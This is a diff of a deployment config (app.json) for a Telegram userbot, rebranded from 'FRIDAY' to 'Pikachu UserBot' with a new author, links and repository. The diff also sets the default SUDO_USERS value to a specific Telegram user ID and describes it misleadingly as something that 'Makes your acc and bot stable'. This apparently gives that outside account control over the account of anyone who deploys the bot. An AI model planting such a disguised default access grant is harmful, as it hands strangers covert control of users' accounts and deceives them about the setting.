@@ -1,6 +1,6 @@
 {
-  "name": "FRIDAY",
-  "description": "Userbot created by a @Mariodevs and join https://t.me/fridaySupportOfficial for any problems or support",
+  "name": "Pikachu UserBot",
+  "description": "Userbot created by a @ItzSjDude and join https://t.me/ItzSjDudeProjects for any problems or support",
   "logo": "https://telegra.ph/file/c3ba2e9b965f624936358.png",
     "keywords": [
     "telegram",
@@ -9,8 +9,8 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://github.com/STARKGANG/FridayUserbot/",
-  "website": "#TODO",
+  "repository": "https://github.com/ItzSjDude/PikachuUserbot/",
+  "website": "https://ItzSjDude.in",
   "success_url": "#TODO",
   "env": {
     "ENV": {
@@ -90,7 +90,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "813878981",
+      "value": "779890498",
       "required": false
     },
     "CHROME_BIN": {
